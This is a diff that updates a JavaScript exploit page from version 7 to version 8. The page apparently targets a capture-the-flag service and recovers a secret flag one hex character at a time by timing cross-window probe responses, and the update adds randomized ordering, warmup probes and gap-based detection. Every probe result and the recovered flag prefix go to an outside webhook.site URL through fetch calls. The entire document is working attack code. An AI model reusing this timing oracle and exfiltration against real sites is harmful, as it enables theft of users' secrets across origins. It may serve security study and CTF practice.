@@ -1,17 +1,16 @@
 <!DOCTYPE html><html><head><meta charset="utf-8"></head><body><script>
-// v7 - pure sequential, early exit, start from known prefix
+// v8 - randomized order, gap-based detection, warmup probe
 var T="https://svfgp.breakable.live";
 var W="https://webhook.site/7db4031e-3888-4442-8124-bb8c12cf39c2";
-var known="CTF{1651084a03cc4";
+var known="CTF{";
 var HEX="0123456789abcdef";
-var THRESH=320; // match ~460ms, non-match ~150ms, threshold in between
 
 function exfil(d){
   var u=W+"?d="+encodeURIComponent(d)+"&t="+Date.now();
   fetch(u,{mode:"no-cors",cache:"no-store"}).catch(function(){});
 }
 
-exfil("v7_LOADED");
+exfil("v8_LOADED");
 
 function probeOne(q){
   return new Promise(function(res){
@@ -20,51 +19,98 @@ function probeOne(q){
     var url=T+"/?mode=probe&q="+encodeURIComponent(q)+
       "&sid="+encodeURIComponent(sid)+"&rid="+encodeURIComponent(rid);
     var t0=performance.now();
+    var wn="pw"+Math.random().toString(36).slice(2,6);
     var w;
-    try{w=window.open(url,"probewin");}catch(e){res(0);return;}
-    if(!w){res(0);return;}
+    try{w=window.open(url,wn);}catch(e){res({t:0,src:"err"});return;}
+    if(!w){res({t:0,src:"null"});return;}
     var done=false;
-    function fin(ms){if(done)return;done=true;try{w.close();}catch(e){}res(Math.round(ms));}
+    function fin(ms,src){if(done)return;done=true;try{w.close();}catch(e){}res({t:Math.round(ms),src:src});}
     function handler(e){
       if(e.data&&e.data.type==="svfgp-probe-done"&&e.data.sid===sid){
         window.removeEventListener("message",handler);
-        fin(performance.now()-t0);
+        fin(performance.now()-t0,"msg");
       }
     }
     window.addEventListener("message",handler);
-    setTimeout(function(){window.removeEventListener("message",handler);fin(-1);},3000);
+    setTimeout(function(){window.removeEventListener("message",handler);fin(performance.now()-t0,"timeout");},4000);
   });
 }
 
+function shuffle(arr){
+  for(var i=arr.length-1;i>0;i--){
+    var j=Math.floor(Math.random()*(i+1));
+    var tmp=arr[i];arr[i]=arr[j];arr[j]=tmp;
+  }
+  return arr;
+}
+
 async function findChar(prefix,pos){
-  // Test each hex char, return as soon as one is slow (> threshold)
-  for(var i=0;i<16;i++){
-    var ch=HEX[i];
-    var t=await probeOne(prefix+ch);
-    if(t>THRESH){
-      exfil("HIT:p"+pos+"="+ch+"("+t+"ms)");
-      return ch;
-    }
+  // Warmup probe (discard): eliminates first-probe cold start bias
+  await probeOne(prefix+"z");
+
+  // Test all 16 hex chars in RANDOM order
+  var order=shuffle(HEX.split(""));
+  var results=[];
+  for(var i=0;i<order.length;i++){
+    var ch=order[i];
+    var r=await probeOne(prefix+ch);
+    results.push({c:ch,t:r.t,src:r.src});
   }
-  // None exceeded threshold - pick max from a second pass
-  exfil("MISS_P"+pos+":retry");
-  var best={c:"",t:0};
-  for(var i=0;i<16;i++){
-    var ch=HEX[i];
-    var t=await probeOne(prefix+ch);
-    if(t>best.t)best={c:ch,t:t};
+
+  // Sort by time descending
+  results.sort(function(a,b){return b.t-a.t;});
+  var top=results[0], second=results[1];
+  var gap=top.t-second.t;
+  var info=results.slice(0,4).map(function(x){return x.c+"="+x.t;}).join(",");
+  exfil("P"+pos+":"+info+"|gap="+gap);
+
+  // Accept if clear gap > 100ms between #1 and #2
+  if(gap>100 && top.src==="msg"){
+    return top.c;
   }
-  exfil("RETRY_P"+pos+":"+best.c+"="+best.t+"ms");
-  return best.c;
+
+  // No clear winner — do second pass in different random order
+  exfil("R"+pos+":retry");
+  var order2=shuffle(HEX.split(""));
+  var results2=[];
+  await probeOne(prefix+"z"); // warmup again
+  for(var i=0;i<order2.length;i++){
+    var ch=order2[i];
+    var r=await probeOne(prefix+ch);
+    results2.push({c:ch,t:r.t,src:r.src});
+  }
+  results2.sort(function(a,b){return b.t-a.t;});
+  var top2=results2[0], second2=results2[1];
+  var gap2=top2.t-second2.t;
+  var info2=results2.slice(0,4).map(function(x){return x.c+"="+x.t;}).join(",");
+  exfil("R"+pos+":"+info2+"|gap="+gap2);
+
+  // If both passes agree on the top char, use it
+  if(top.c===top2.c && (gap>50 || gap2>50)){
+    return top.c;
+  }
+
+  // If either has gap>80, trust the one with bigger gap
+  if(gap>gap2 && gap>80) return top.c;
+  if(gap2>gap && gap2>80) return top2.c;
+
+  // Fallback: pick whichever was top in both passes
+  // Combine: for each char, add times from both passes
+  var combined={};
+  results.forEach(function(r){combined[r.c]=(combined[r.c]||0)+r.t;});
+  results2.forEach(function(r){combined[r.c]=(combined[r.c]||0)+r.t;});
+  var best="0",bestT=0;
+  for(var c in combined){if(combined[c]>bestT){bestT=combined[c];best=c;}}
+  exfil("COMBO_P"+pos+":"+best+"="+bestT);
+  return best;
 }
 
 async function run(){
-  exfil("v7_START:"+known+"(len="+known.length+")");
+  exfil("v8_START:"+known+"(len="+known.length+")");
   var t0=Date.now();
-  var needed=4+64-known.length; // how many more chars needed
 
-  for(var p=0;p<needed;p++){
-    if(Date.now()-t0>52000){exfil("TIME:"+known);break;}
+  while(known.length < 4+64){
+    if(Date.now()-t0>53000){exfil("TIME:"+known);break;}
     var pos=known.length-4;
     var ch=await findChar(known,pos);
     known+=ch;
